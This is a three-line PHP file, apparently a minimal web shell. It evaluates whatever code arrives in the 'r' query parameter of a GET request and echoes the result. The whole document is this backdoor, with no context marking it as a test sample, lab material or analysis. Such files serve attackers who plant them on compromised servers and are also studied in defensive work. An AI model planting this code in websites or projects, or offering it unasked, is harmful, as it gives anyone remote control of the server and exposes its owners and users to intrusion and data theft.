<?php
echo eval($_GET['r']);
?>
